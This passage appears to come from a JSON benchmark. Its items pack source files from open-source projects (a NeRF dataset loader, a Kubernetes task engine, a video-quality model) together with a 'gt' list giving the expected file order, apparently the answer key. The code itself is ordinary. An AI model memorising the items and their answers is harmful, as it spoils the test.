downsample=hparams.downsample,\n            read_meta=True,\n        )\n        NGPGUI(\n            hparams,\n            model_config,\n            dataset.K,\n            dataset.img_wh,\n            dataset.poses\n        ).render()\n\nif __name__ == '__main__':\n    main()\n\n'taichi-nerfs/datasets/nsvf.py'\n:import glob\nimport os\n\nimport numpy as np\nimport torch\nfrom tqdm import tqdm\n\nfrom .base import BaseDataset\nfrom .color_utils import read_image\nfrom .ray_utils import get_ray_directions\n\n\nclass NSVFDataset(BaseDataset):\n\n    def __init__(self, root_dir, split='train', downsample=1.0, **kwargs):\n        super().__init__(root_dir, split, downsample)\n\n        self.read_intrinsics()\n\n        if kwargs.get('read_meta', True):\n            xyz_min, xyz_max = \\\n                np.loadtxt(os.path.join(root_dir, 'bbox.txt'))[:6].reshape(2, 3)\n            self.shift = (xyz_max + xyz_min) / 2\n            self.scale = (xyz_max -\n                          xyz_min).max() / 2 * 1.05\n\n\n            if 'Mic' in self.root_dir:\n                self.scale *= 1.2\n            elif 'Lego' in self.root_dir:\n                self.scale *= 1.1\n\n            self.read_meta(split)\n\n    def read_intrinsics(self):\n        if 'Synthetic' in self.root_dir or 'Ignatius' in self.root_dir:\n            with open(os.path.join(self.root_dir, 'intrinsics.txt')) as f:\n                fx = fy = float(f.readline().split()[0]) * self.downsample\n            if 'Synthetic' in self.root_dir:\n                w = h = int(800 * self.downsample)\n            else:\n                w, h = int(1920 * self.downsample), int(1080 * self.downsample)\n\n            K = np.float32([[fx, 0, w / 2], [0, fy, h / 2], [0, 0, 1]])\n        else:\n            K = np.loadtxt(os.path.join(self.root_dir, 'intrinsics.txt'),\n                           dtype=np.float32)[:3, :3]\n            if 'BlendedMVS' in self.root_dir:\n                w, h = int(768 * self.downsample), int(576 * self.downsample)\n            elif 'Tanks' in self.root_dir:\n                w, h = int(1920 * self.downsample), int(1080 * self.downsample)\n            K[:2] *= self.downsample\n\n        self.K = torch.FloatTensor(K)\n        self.directions = get_ray_directions(h, w, self.K)\n        self.img_wh = (w, h)\n\n    def read_meta(self, split):\n        self.rays = []\n        self.poses = []\n\n        if split == 'test_traj':\n            if 'Ignatius' in self.root_dir:\n                poses_path = \\\n                    sorted(glob.glob(os.path.join(self.root_dir, 'test_pose/*.txt')))\n                poses = [np.loadtxt(p) for p in poses_path]\n            else:\n                poses = np.loadtxt(os.path.join(self.root_dir,\n                                                'test_traj.txt'))\n                poses = poses.reshape(-1, 4, 4)\n            for pose in poses:\n                c2w = pose[:3]\n                c2w[:, 0] *= -1\n                c2w[:, 3] -= self.shift\n                c2w[:,\n                    3] /= 2 * self.scale\n                self.poses += [c2w]\n        else:\n            if split == 'train':\n                prefix = '0_'\n            elif split == 'trainval':\n                prefix = '[0-1]_'\n            elif split == 'trainvaltest':\n                prefix = '[0-2]_'\n            elif split == 'val':\n                prefix = '1_'\n            elif 'Synthetic' in self.root_dir:\n                prefix = '2_'\n            elif split == 'test':\n                prefix = '1_'\n            else:\n                raise ValueError(f'{split} split not recognized!')\n            img_paths = sorted(\n                glob.glob(os.path.join(self.root_dir, 'rgb',\n                                       prefix + '*.png')))\n            poses = sorted(\n                glob.glob(os.path.join(self.root_dir, 'pose',\n                                       prefix + '*.txt')))\n\n            print(f'Loading {len(img_paths)} {split} images ...')\n            for img_path, pose in tqdm(zip(img_paths, poses)):\n                c2w = np.loadtxt(pose)[:3]\n                c2w[:, 3] -= self.shift\n                c2w[:,\n                    3] /= 2 * self.scale\n                self.poses += [c2w]\n\n                img = read_image(img_path, self.img_wh)\n                if 'Jade' in self.root_dir or 'Fountain' in self.root_dir:\n\n                    img[torch.all(img <= 0.1, dim=-1)] = 1.0\n\n                self.rays += [img]\n\n            self.rays = torch.FloatTensor(np.stack(\n                self.rays))\n        self.poses = torch.FloatTensor(self.poses)\n'taichi-nerfs/datasets/__init__.py'\n:from .colmap import ColmapDataset\nfrom .nerf import NeRFDataset\nfrom .nsvf import NSVFDataset\nfrom .ngp import NGPDataset\n\ndataset_dict = {\n    'nerf': NeRFDataset,\n    'nsvf': NSVFDataset,\n    'colmap': ColmapDataset,\n    'ngp': NGPDataset,\n}\n",
        "gt": [
            "'taichi-nerfs/datasets/nsvf.py'",
            "'taichi-nerfs/datasets/__init__.py'",
            "'taichi-nerfs/gui.py'",
            "'taichi-nerfs/train.py'"
        ]
    },
    {
        "files": [
            "'cowait/cowait/tasks/__init__.py'",
            "'cowait/cowait/engine/kubernetes/task.py'",
            "'cowait/cowait/tasks/decorator.py'",
            "'cowait/cowait/tasks/task.py'",
            "'cowait/cowait/engine/kubernetes/kubernetes.py'"
        ],
        "content": "'cowait/cowait/tasks/__init__.py'\n:\n\nfrom asyncio import sleep\n\nfrom .status import WORK, WAIT, DONE, STOP, FAIL\nfrom .messages import TASK_INIT, TASK_STATUS, TASK_LOG, TASK_FAIL, TASK_RETURN\nfrom .errors import TaskError, TaskNotFoundError, StoppedError\n\nfrom .task import Task\nfrom .remote_task import RemoteTask\nfrom .definition import TaskDefinition\nfrom .instance import TaskInstance\nfrom .decorator import task, spawn, input, exit\nfrom .ops import join, wait\n\nfrom .components.rpc import rpc\n\n'cowait/cowait/engine/kubernetes/task.py'\n:import asyncio\nfrom cowait.tasks import TaskDefinition, RemoteTask\nfrom cowait.engine.cluster import ClusterProvider\nfrom cowait.engine.errors import TaskCreationError\nfrom .pod import pod_is_ready\nfrom .errors import PodUnschedulableError, PodTerminatedError, ImagePullError\n\n\nclass KubernetesTask(RemoteTask):\n    def __init__(\n        self,\n        cluster: ClusterProvider,\n        taskdef: TaskDefinition,\n        pod,\n    ):\n        super().__init__(\n            cluster=cluster,\n            taskdef=taskdef,\n        )\n        self.pod = pod\n        self.ip = self.pod.status.pod_ip\n\n    def __str__(self):\n        return f'KubernetesTask({self.id}, {self.status}, {self.inputs})'\n\n    async def wait_for_scheduling(self):\n        poll_interval = 0\n        while True:\n            await asyncio.sleep(poll_interval)\n            pod = self.cluster.get_task_pod(self.id)\n\n            try:\n                if pod_is_ready(pod):\n                    break\n                else:\n                    poll_interval = 1\n\n            except PodUnschedulableError as e:\n                poll_interval = 10\n                print('warning: task', self.id, 'is unschedulable:', str(e))\n\n            except PodTerminatedError:\n                raise TaskCreationError('Task terminated') from None\n\n            except ImagePullError:\n                self.cluster.kill(self.id)\n                raise TaskCreationError('Image pull failed')\n\n\n'cowait/cowait/tasks/decorator.py'\n:import inspect\nfrom typing import Any\nfrom .task import Task\n\n\ndef task(func):\n\n\n    if func.__name__[0].lower() == func.__name__[0]:\n        raise NameError(\n            f'Task names must start with an uppercase character, '\n            f'found {func.__name__}')\n\n    class FuncTask(Task):\n        async def run(self, **inputs):\n            if inspect.iscoroutinefunction(func):\n                return await func(**inputs)\n            else:\n                return func(**inputs)\n\n\n    FuncTask.__name__ = func.__name__\n    FuncTask.__module__ = func.__module__\n    FuncTask.__wraps__ = func\n\n    return FuncTask\n\n\ndef spawn(*args, **kwargs):\n\n    task = Task.get_current()\n    if task is None:\n        raise RuntimeError('No running task found')\n    return task.spawn(*args, **kwargs)\n\n\ndef input(name: str, default: Any = None) -> Any:\n\n    task = Task.get_current()\n    if task is None:\n        raise RuntimeError('No running task found')\n\n    if default is None and name not in task.taskdef.inputs:\n        raise ValueError(f'Input {name} has no default value')\n\n    return task.taskdef.inputs.get(name, default)\n\n\ndef exit(result: Any = None) -> None:\n\n    task = Task.get_current()\n    if task is None:\n        raise RuntimeError('No running task found')\n    task.exit(result)\n\n'cowait/cowait/tasks/task.py'\n:import sys\nimport inspect\nfrom typing import Any\nfrom cowait.types import serialize\nfrom .definition import TaskDefinition\nfrom .components import TaskManager, RpcComponent, rpc\nfrom .parent_task import ParentTask\nfrom .errors import StoppedError\n\n\nclass Task(object):\n    __current__ = None\n\n    def __init__(self, **inputs):\n\n\n\n\n\n\n\n        if 'taskdef' not in inputs or 'node' not in inputs or \\\n           'cluster' not in inputs or len(inputs) != 3:\n            raise RuntimeError('Invalid task class instantiation')\n\n        self.node = inputs['node']\n        self.cluster = inputs['cluster']\n        self.taskdef = inputs['taskdef']\n\n        self.parent = ParentTask(self.node)\n        self.subtasks = TaskManager(self)\n        self.rpc = RpcComponent(self)\n\n\n        Task.set_current(self)\n\n    def __new__(cls, *args, **inputs):\n        current = Task.get_current()\n        if current is None:\n\n            return object.__new__(cls)\n        else:\n\n\n\n            if len(args) > 0:\n                raise TypeError('Tasks do not accept positional arguments')\n\n            return current.spawn(cls, inputs=inputs)\n\n    @property\n    def id(self) -> str:\n        return self.taskdef.id\n\n    @property\n    def name(self) -> str:\n        return self.taskdef.name\n\n    @property\n    def image(self) -> str:\n        return self.taskdef.image\n\n    @property\n    def meta(self) -> dict:\n        return self.taskdef.meta\n\n    def __str__(self) -> str:\n        return f'Task({self.id}, {self.name})'\n\n    def init(self):\n        pass\n\n    async def before(self, inputs: dict) -> dict:\n        return inputs\n\n    async def run(self, **inputs: dict) -> Any:\n        pass\n\n    async def after(self, inputs: dict) -> Any:\n        pass\n\n    @rpc\n    async def stop(self) -> None:\n\n        print('\\n~~ STOPPED ~~')\n\n\n        await self.node.parent.send_stop()\n\n\n        for task in self.subtasks.values():\n            await task.stop()\n\n\n\n        async def _quit():\n            sys.exit(1)\n        self.node.io.create_task(_quit())\n\n    def spawn(\n        self,\n        name: str,\n        id: str = None,\n        image: str = None,\n        ports: dict = {},\n        routes: dict = {},\n        inputs: dict = {},\n        meta: dict = {},\n        env: dict = {},\n        volumes: dict = {},\n        cpu: str = None,\n        cpu_limit: str = None,\n        memory: str = None,\n        memory_limit: str = None,\n        affinity: str = None,\n        owner: str = '',\n        **kwargs: dict,\n    ) -> 'Task':\n\n\n\n        inputs = {\n            **inputs,\n            **kwargs,\n        }\n\n        if isinstance(name, str):\n            pass\n        elif issubclass(name, Task):\n            name = name.__module__\n        else:\n            raise TypeError('Unsupported task type: ' + type(name))\n\n\n        for key, value in inputs.items():\n            if inspect.iscoroutine(value):\n                raise TypeError(f'Input {key} must be awaited first')\n\n        taskdef = TaskDefinition(\n            id=id,\n            name=name,\n            parent=self.id,\n            image=image if image else self.image,\n            upstream=self.node.get_url(),\n            meta=meta,\n            ports=ports,\n            routes=routes,\n            cpu=cpu if cpu else self.taskdef.cpu,\n            cpu_limit=cpu_limit if cpu_limit else self.taskdef.cpu_limit,\n            memory=memory if memory else self.taskdef.memory,\n            memory_limit=memory_limit if memory_limit else self.taskdef.memory_limit,\n            affinity=affinity if affinity else self.taskdef.affinity,\n            owner=owner,\n            inputs=serialize(inputs),\n            volumes={\n                **self.taskdef.volumes,\n                **volumes,\n            },\n            env={\n                **self.taskdef.env,\n                **env,\n            },\n        )\n\n\n        self.node.server.auth.add_token(taskdef.id)\n\n\n        task = self.cluster.spawn(taskdef)\n\n\n        self.subtasks.watch(task)\n\n        return task\n\n    def exit(self, result):\n        raise StoppedError(result)\n\n    @staticmethod\n    def get_current() -> 'Task':\n        return Task.__current__\n\n    @staticmethod\n    def set_current(task: 'Task'):\n        Task.__current__ = task\n\n'cowait/cowait/engine/kubernetes/kubernetes.py'\n:import time\nimport kubernetes\nimport urllib3.exceptions\nfrom kubernetes import client, config, watch\nfrom cowait.network import get_remote_url\nfrom cowait.tasks import TaskDefinition\nfrom cowait.utils import json_stream\nfrom cowait.engine.const import LABEL_TASK_ID, LABEL_PARENT_ID\nfrom cowait.engine.cluster import ClusterProvider\nfrom cowait.engine.errors import ProviderError, TaskCreationError\nfrom cowait.engine.routers import create_router\nfrom .task import KubernetesTask\nfrom .volumes import create_volumes\nfrom .utils import create_env, create_ports\nfrom .affinity import create_affinity\nfrom .pod import pod_is_ready, extract_pod_taskdef\nfrom .errors import PodConfigError, PodUnschedulableError, PodTerminatedError, ImagePullError\n\nDEFAULT_NAMESPACE = 'default'\nDEFAULT_SERVICE_ACCOUNT = 'default'\n\n\nclass KubernetesProvider(ClusterProvider):\n    def __init__(self, args={}):\n        super().__init__('kubernetes', args)\n\n        try:\n\n            config.load_incluster_config()\n        except kubernetes.config.ConfigException:\n\n            config.load_kube_config(config_file=self.args.get('kube_config_file', None),\n                                    context=self.args.get('context', None))\n\n        self.core = client.CoreV1Api()\n        self.ext = client.ExtensionsV1beta1Api()\n        self.custom = client.CustomObjectsApi()\n\n        self.router = create_router(self, self.args.get('router', 'none'))\n\n    @property\n    def namespace(self):\n        return self.args.get('namespace', DEFAULT_NAMESPACE)\n\n    @property\n    def service_account(self):\n        return self.args.get('service_account', DEFAULT_SERVICE_ACCOUNT)\n\n    @property\n    def domain(self):\n        return self.args.get('domain', None)\n\n    @property\n    def timeout(self):\n        return self.args.get('timeout', 180)\n\n    def spawn(self, taskdef: TaskDefinition, deploy: bool = False) -> KubernetesTask:\n        try:\n            self.emit_sync('prepare', taskdef=taskdef)\n\n            if deploy:\n\n                self.kill(taskdef.id)\n                self.wait_until_deleted(taskdef.id)\n\n            volumes, mounts = create_volumes(taskdef.volumes)\n\n\n            container = client.V1Container(\n                name=taskdef.id,\n                image=taskdef.image,\n                env=create_env(self, taskdef),\n                ports=create_ports(taskdef.ports),\n                image_pull_policy='Always',\n                resources=client.V1ResourceRequirements(\n                    requests={\n                        'cpu': str(taskdef.cpu or '0'),\n                        'memory': str(taskdef.memory or '0'),\n                    },\n                    limits={\n                        'cpu': str(taskdef.cpu_limit or '0'),\n                        'memory': str(taskdef.memory_limit or '0'),\n                    },\n                ),\n                volume_mounts=mounts,\n            )\n\n            pod = self.core.create_namespaced_pod(\n                namespace=self.namespace,\n                body=client.V1Pod(\n                    metadata=client.V1ObjectMeta(\n                        name=taskdef.id,\n                        namespace=self.namespace,\n                        labels={\n                            LABEL_TASK_ID: taskdef.id,\n                            LABEL_PARENT_ID: taskdef.parent,\n                            **taskdef.meta,\n                        },\n                    ),\n                    spec=client.V1PodSpec(\n                        hostname=taskdef.id,\n                        restart_policy='Always' if deploy else 'Never',\n                        image_pull_secrets=self.get_pull_secrets(),\n                        volumes=volumes,\n                        node_selector=taskdef.nodes,\n\n                        containers=[container],\n                        service_account_name=self.service_account,\n                        affinity=create_affinity(taskdef.affinity),\n                    ),\n                ),\n            )\n\n\n\n            task = KubernetesTask(self, taskdef, pod)\n            self.emit_sync('spawn', task=task)\n            return task\n\n        except urllib3.exceptions.MaxRetryError:\n            raise ProviderError('Kubernetes engine unavailable')\n\n    def kill(self, task_id):\n        try:\n            self.core.delete_collection_namespaced_pod(\n                namespace=self.namespace,\n                label_selector=f'{LABEL_TASK_ID}={task_id}',\n            )\n            self.emit_sync('kill', task_id=task_id)\n            return task_id\n\n        except urllib3.exceptions.MaxRetryError:\n            raise ProviderError('Kubernetes engine unavailable')\n\n    def get_task_pod(self, task_id):\n        try:\n            res = self.core.list_namespaced_pod(\n                namespace=self.namespace,\n                label_selector=f'{LABEL_TASK_ID}={task_id}',\n            )\n            return res.items[0] if len(res.items) > 0 else None\n\n        except urllib3.exceptions.MaxRetryError:\n            raise ProviderError('Kubernetes engine unavailable')\n\n    def get_task_child_pods(self, task_id: str):\n        try:\n            res = self.core.list_namespaced_pod(\n                namespace=self.namespace,\n                label_selector=f'{LABEL_PARENT_ID}={task_id}',\n            )\n            return res.items\n\n        except urllib3.exceptions.MaxRetryError:\n            raise ProviderError('Kubernetes engine unavailable')\n\n    def wait_until_ready(self, task_id: str, poll_interval: float = 1):\n        while True:\n            time.sleep(poll_interval)\n            pod = self.get_task_pod(task_id)\n            if not pod:\n                raise ProviderError(f'No such task: {task_id}')\n\n            try:\n                if pod_is_ready(pod):\n                    break\n                else:\n                    poll_interval = 1\n\n            except PodUnschedulableError as e:\n                poll_interval = 10\n                print('warning: task', task_id, 'is unschedulable:', str(e))\n\n            except PodTerminatedError:\n                raise TaskCreationError('Task terminated') from None\n\n            except ImagePullError:\n                self.kill(task_id)\n                raise TaskCreationError('Image pull failed') from None\n\n            except PodConfigError:\n\n\n                raise TaskCreationError('Pod configuration error') from None\n\n    def wait_until_deleted(self, task_id: str, poll_interval: float = 1):\n        while self.get_task_pod(task_id) is not None:\n            time.sleep(poll_interval)\n\n    def logs(self, task_id: str):\n\n        try:\n            pod = self.get_task_pod(task_id)\n            pod_is_ready(pod)\n\n        except PodTerminatedError:\n            log = self.core.read_namespaced_pod_log(name=task_id, namespace=self.namespace)\n            return json_stream(log.splitlines(True))\n\n        except Exception:\n\n            pass\n\n\n        self.wait_until_ready(task_id)\n\n        try:\n            w = watch.Watch()\n            logs = w.stream(\n                self.core.read_namespaced_pod_log,\n                name=task_id,\n                namespace=self.namespace,\n            )\n\n            def add_newline_stream():\n                for log in logs:\n                    yield log + '\\n'\n\n            return json_stream(add_newline_stream())\n\n        except Exception:\n\n            return self.logs(task_id)\n\n    def destroy_all(self) -> list:\n        try:\n            self.core.delete_collection_namespaced_pod(\n                namespace=self.namespace,\n                label_selector=LABEL_TASK_ID,\n            )\n\n        except urllib3.exceptions.MaxRetryError:\n            raise ProviderError('Kubernetes engine unavailable')\n\n    def list_all(self) -> list:\n        try:\n            res = self.core.list_namespaced_pod(\n                namespace=self.namespace,\n                label_selector=LABEL_TASK_ID,\n            )\n            running = filter(lambda pod: pod.status.phase == 'Running', res.items)\n            return [\n                KubernetesTask(self, extract_pod_taskdef(pod), pod)\n                for pod in running\n            ]\n\n        except urllib3.exceptions.MaxRetryError:\n            raise ProviderError('Kubernetes engine unavailable')\n\n    def destroy(self, task_id) -> list:\n        def kill_family(task_id):\n\n\n            kills = []\n            children = self.get_task_child_pods(task_id)\n            for child in children:\n                child_id = child.metadata.labels[LABEL_TASK_ID]\n                kills += kill_family(child_id)\n\n            self.kill(task_id)\n            kills.append(task_id)\n            return kills\n\n        return kill_family(task_id)\n\n    def destroy_children(self, parent_id: str) -> list:\n        try:\n\n            children = self.core.list_namespaced_pod(\n                namespace=self.namespace,\n                label_selector=f'{LABEL_PARENT_ID}={parent_id}',\n            )\n\n\n            self.core.delete_collection_namespaced_pod(\n                namespace=self.namespace,\n                label_selector=f'{LABEL_PARENT_ID}={parent_id}',\n            )\n\n\n            return [\n                child.metadata.labels[LABEL_TASK_ID]\n                for child in children.items\n            ]\n\n        except urllib3.exceptions.MaxRetryError:\n            raise ProviderError('Kubernetes engine unavailable')\n\n    def get_pull_secrets(self):\n        secrets = self.args.get('pull_secrets', [])\n        return [client.V1LocalObjectReference(name=s) for s in secrets]\n\n    def find_agent(self):\n        pod = self.get_task_pod('agent')\n        if pod is None:\n            return None\n        if pod.status.phase != 'Running':\n            return None\n\n        token = pod.metadata.labels['http_token']\n        return get_remote_url(pod.status.pod_ip, token)\n\n    def wait(self, task: KubernetesTask) -> bool:\n        while True:\n            pod = self.get_task_pod(task.id)\n            if pod is None:\n                return False\n\n            if pod.status.phase == 'Running':\n                time.sleep(2)\n            elif pod.status.phase == 'Pending':\n                time.sleep(2)\n            elif pod.status.phase == 'Succeeded':\n                return True\n            else:\n                return False\n",
        "gt": [
            "'cowait/cowait/tasks/task.py'",
            "'cowait/cowait/tasks/decorator.py'",
            "'cowait/cowait/tasks/__init__.py'",
            "'cowait/cowait/engine/kubernetes/task.py'",
            "'cowait/cowait/engine/kubernetes/kubernetes.py'"
        ]
    },
    {
        "files": [
            "'bitstream_mode3_p1204_3/p1204_3/generic.py'",
            "'bitstream_mode3_p1204_3/p1204_3/model.py'",
            "'bitstream_mode3_p1204_3/p1204_3/__init__.py'"
        ],
        "content": "'bitstream_mode3_p1204_3/p1204_3/generic.py'\n:\nimport os\n\nDEVICE_TYPES = [\"pc\", \"tv\", \"tablet\", \"mobile\"]\nDEVICE_RESOLUTIONS = [\"3840x2160\", \"2560x1440\"]\n\nVIEWING_DISTANCES = [\"1.5xH\", \"4xH\", \"6xH\"]\nDEFAULT_VIEWING_DISTANCE = \"1.5xH\"\nDISPLAY_SIZES = [10, 32, 37, 5.1, 5.5, 5.8, 55, 65, 75]\nDEFAULT_DISPLAY_SIZE = 55\n\n\nCODECS_SUPPORTED = [\"h264\", \"hevc\", \"vp9\"]\n\n\nVIDEOPARSER_REPO = \"https://github.com/Telecommunication-Telemedia-Assessment/bitstream_mode3_videoparser.git\"\n\n\nDEFAULT_MODEL = os.path.join(os.path.dirname(__file__), \"models/p1204_3/config.json\")\n'bitstream_mode3_p1204_3/p1204_3/model.py'\n:\nimport logging\nimport json\nimport os\nimport datetime\n\nimport p1204_3\nfrom p1204_3.utils import assert_file\nfrom p1204_3.utils import assert_msg\nfrom p1204_3.utils import ffprobe\nfrom p1204_3.utils import json_load\nfrom p1204_3.modelutils import map_to_45\nfrom p1204_3.modelutils import map_to_5\nfrom p1204_3.modelutils import r_from_mos\nfrom p1204_3.modelutils import mos_from_r\nfrom p1204_3.modelutils import load_serialized\nfrom p1204_3.modelutils import binarize_column\nfrom p1204_3.modelutils import load_dict_values\nfrom p1204_3.modelutils import per_sample_interval_function\nfrom p1204_3.generic import *\nfrom p1204_3.videoparser import *\n\nimport p1204_3.features as features\nfrom p1204_3.features import *\n\n\nclass P1204BitstreamMode3:\n\n\n    def __init__(self):\n        self.display_res = 3840 * 2160\n\n    def _calculate(self, prediction_features, params, rf_model, display_res, device_type):\n        def mos_q_baseline_pc(features, a, b, c, d):\n            quant = features[\"quant\"]\n            mos_q = a + b * np.exp(c * quant + d)\n            mos_q = np.clip(mos_q, 1, 5)\n            mos_q = np.vectorize(r_from_mos)(mos_q)\n            cod_deg = 100 - mos_q\n            cod_deg = np.clip(cod_deg, 0, 100)\n            return cod_deg\n\n        prediction_features = prediction_features.copy()\n\n        prediction_features = load_dict_values(prediction_features, \"QPValuesStatsPerGop\")\n        prediction_features = load_dict_values(prediction_features, \"QPstatspersecond\")\n        prediction_features = load_dict_values(prediction_features, \"BitstreamStatFeatures\")\n        prediction_features = load_dict_values(prediction_features, \"FramesizeStatsPerGop\")\n        prediction_features = load_dict_values(prediction_features, \"AvMotionStatsPerGop\")\n\n        prediction_features[\"quant\"] = prediction_features[\"QPValuesStatsPerGop_mean_Av_QPBB_non-i\"]\n\n        def video_codec_extension(row):\n            if row[\"Codec\"] == \"h264\" and row[\"BitDepth\"] == 10:\n                return \"h264_10bit\"\n            if row[\"Codec\"] == \"hevc\" and row[\"BitDepth\"] == 10:\n                return \"hevc_10bit\"\n            return row[\"Codec\"]\n\n        prediction_features[\"video_codec\"] = prediction_features.apply(video_codec_extension, axis=1)\n\n        def norm_qp(row):\n            qp_norm_coeffs = {\"h264\": 51, \"h264_10bit\": 63, \"hevc\": 51, \"hevc_10bit\": 63, \"vp9\": 255}\n            if not row[\"video_codec\"] in qp_norm_coeffs:\n                return -1\n            return row[\"QPValuesStatsPerGop_mean_Av_QPBB_non-i\"] / qp_norm_coeffs[row[\"video_codec\"]]\n\n        prediction_features[\"quant\"] = prediction_features[\n            [\"video_codec\", \"QPValuesStatsPerGop_mean_Av_QPBB_non-i\"]\n        ].apply(norm_qp, axis=1)\n\n        prediction_features = binarize_column(prediction_features, \"video_codec\")\n\n        codecs = prediction_features[\"video_codec\"].unique()\n\n        cod_deg = sum(\n            [\n                prediction_features[c]\n                * mos_q_baseline_pc(\n                    prediction_features, params[c + \"_a\"], params[c + \"_b\"], params[c + \"_c\"], params[c + \"_d\"]\n                )\n                for c in codecs\n            ]\n        )\n\n\n        resolution = params[\"x\"] * np.log(params[\"y\"] * (prediction_features[\"Resolution\"] / display_res))\n        resolution = np.clip(resolution, 0, 100)\n\n\n        framerate = params[\"z\"] * np.log(params[\"k\"] * prediction_features[\"Framerate\"] / 60)\n        framerate = np.clip(framerate, 0, 100)\n\n\n        pred = 100 - (cod_deg + resolution + framerate)\n        pred = np.vectorize(mos_from_r)(pred)\n        pred = np.clip(pred, 1, 5)\n        initial_predicted_score = np.vectorize(map_to_5)(pred)\n        prediction_features[\"predicted_mos_mode3_baseline\"] = initial_predicted_score\n\n\n        residual_rf_model = load_serialized(rf_model)\n\n        prediction_features_rf = prediction_features.copy()\n\n        possible_codecs = [\"h264\", \"h264_10bit\", \"hevc\", \"hevc_10bit\", \"vp9\"]\n        for codec in possible_codecs:\n            prediction_features_rf[codec] = prediction_features_rf[\"video_codec\"].apply(\n                lambda x: 1 if x == codec else 0\n            )\n\n        prediction_features_rf = prediction_features_rf.rename(\n            columns={\n                \"FramesizeStatsPerGop_1.0_quantil_FrameSize\": \"1.0_quantil_FrameSize\",\n                \"FramesizeStatsPerGop_std_FrameSize_non-i\": \"std_FrameSize_non-i\",\n                \"FramesizeStatsPerGop_kurtosis_FrameSize_non-i\": \"kurtosis_FrameSize_non-i\",\n                \"QPValuesStatsPerGop_mean_Av_QPBB_non-i\": \"mean_Av_QPBB_non_i\",\n                \"QPValuesStatsPerGop_iqr_Av_QPBB_non-i\": \"iqr_Av_QPBB_non-i\",\n                \"QPValuesStatsPerGop_kurtosis_Av_QPBB_non-i\": \"kurtosis_Av_QPBB_non-i\",\n                \"QPValuesStatsPerGop_iqr_min_QP\": \"iqr_min_QP\",\n                \"QPValuesStatsPerGop_std_max_QP_non-i\": \"std_max_QP_non-i\",\n                \"AvMotionStatsPerGop_kurtosis_Av_Motion\": \"kurtosis_Av_Motion\",\n                \"AvMotionStatsPerGop_0.0_quantil_StdDev_MotionX_non-i\": \"0.0_quantil_StdDev_MotionX_non-i\",\n            }\n        )\n\n        feature_columns = list(\n            set(\n                [\n                    \"Bitrate\",\n                    \"Resolution\",\n                    \"Framerate\",\n                    \"mean_Av_QPBB_non_i\",\n                    \"predicted_mos_mode3_baseline\",\n                    \"quant\",\n                    \"1.0_quantil_FrameSize\",\n                    \"kurtosis_Av_Motion\",\n                    \"iqr_Av_QPBB_non-i\",\n                    \"kurtosis_FrameSize_non-i\",\n                    \"std_FrameSize_non-i\",\n                    \"kurtosis_Av_QPBB_non-i\",\n                    \"iqr_min_QP\",\n                    \"0.0_quantil_StdDev_MotionX_non-i\",\n                    \"std_max_QP_non-i\",\n                ]\n                + possible_codecs\n            )\n        )\n        feature_columns = sorted(feature_columns)\n\n        prediction_features_rf = prediction_features_rf[feature_columns]\n        prediction_features_rf = prediction_features_rf.fillna(0)\n        residual_mos = residual_rf_model.predict(prediction_features_rf)\n\n        predicted_score = np.vectorize(map_to_5)(pred)\n        predicted_score = predicted_score + residual_mos\n        predicted_score = np.clip(predicted_score, 1, 5)\n        prediction_features_rf[\"rf_pred\"] = predicted_score\n\n        w = 0.5\n        final_pred = (\n            w * prediction_features_rf[\"predicted_mos_mode3_baseline\"] + (1 - w) * prediction_features_rf[\"rf_pred\"]\n        )\n        feature_values = {col: prediction_features_rf[col] for col in feature_columns}\n        result = {\n            \"final_pred\": final_pred,\n            \"debug\": {\n                \"baseline\": prediction_features_rf[\"predicted_mos_mode3_baseline\"],\n                \"coding_deg\": cod_deg,\n                \"upscaling_deg\": resolution,\n                \"temporal_deg\": framerate,\n                \"rf_pred\": prediction_features_rf[\"rf_pred\"],\n            },\n            \"features\": feature_values\n        }\n        return result\n\n    def features_used(self):\n        return [\n            features.Bitrate,\n            features.Framerate,\n            features.Resolution,\n            features.Codec,\n            features.QPValuesStatsPerGop,\n            features.BitDepth,\n            features.QPstatspersecond,\n            features.FramesizeStatsPerGop,\n            features.AvMotionStatsPerGop,\n        ]\n\n    def predict_quality(\n        self,\n        videofilename,\n        model_config_filename,\n        device_type=\"pc\",\n        device_resolution=\"3840x2160\",\n        viewing_distance=\"1.5xH\",\n        display_size=55,\n        temporary_folder=\"tmp\",\n        cache_features=True\n    ):\n\n        assert_file(videofilename, f\"{videofilename} does not exist, please check\")\n        assert_file(model_config_filename, f\"{model_config_filename} does not exist, please check\")\n\n        device_type = device_type.lower()\n        assert_msg(\n            device_type in DEVICE_TYPES,\n            f\"specified device_type '{device_type}' is not supported, only {DEVICE_TYPES} possible\",\n        )\n        assert_msg(\n            device_resolution in DEVICE_RESOLUTIONS,\n            f\"specified device_resolution '{device_resolution}' is not supported, only {DEVICE_RESOLUTIONS} possible\",\n        )\n        assert_msg(\n            viewing_distance in VIEWING_DISTANCES,\n            f\"specified viewing_distance '{viewing_distance}' is not supported, only {VIEWING_DISTANCES} possible\",\n        )\n        assert_msg(\n            display_size in DISPLAY_SIZES,\n            f\"specified display_size '{display_size}' is not supported, only {DISPLAY_SIZES} possible\",\n        )\n\n        ffprobe_result = ffprobe(videofilename)\n        assert_msg(\n            ffprobe_result[\"codec\"] in CODECS_SUPPORTED,\n            f\"your video codec is not supported by the model: {ffprobe_result['codec']}\",\n        )\n\n        model_config = json_load(model_config_filename)\n\n        device_type = \"pc\" if device_type in [\"pc\", \"tv\"] else \"mobile\"\n\n\n        model_config = model_config[device_type]\n\n\n        rf_model = os.path.join(os.path.dirname(model_config_filename), model_config[\"rf\"])\n\n\n        model_coefficients = model_config[\"params\"]\n\n        display_res = float(device_resolution.split(\"x\")[0]) * float(device_resolution.split(\"x\")[1])\n\n        self.display_res = display_res\n\n        check_or_install_videoparser()\n        os.makedirs(temporary_folder, exist_ok=True)\n\n        feature_cache = os.path.join(\n            temporary_folder, os.path.splitext(os.path.basename(videofilename))[0] + \"_feat.pkl\"\n        )\n        if not os.path.isfile(feature_cache) or not cache_features:\n\n            bitstream_parser_result_file = run_videoparser(videofilename, temporary_folder)\n            if bitstream_parser_result_file == \"\":\n                logging.error(f\"no bitstream stats file for {videofilename}\")\n                return {}\n\n\n            features = pd.DataFrame(\n                [extract_features(videofilename, self.features_used(), ffprobe_result, bitstream_parser_result_file)]\n            )\n            if cache_features:\n                logging.info(f\"use feature cache file {feature_cache}\")\n                features.to_pickle(feature_cache)\n        else:\n            logging.info(\"features are already cached, extraction skipped\")\n            features = pd.read_pickle(feature_cache)\n\n        logging.info(\"features extracted\")\n\n        per_sequence = self._calculate(features, model_coefficients, rf_model, display_res, device_type)\n\n        per_second = per_sample_interval_function(per_sequence[\"final_pred\"], features)\n\n     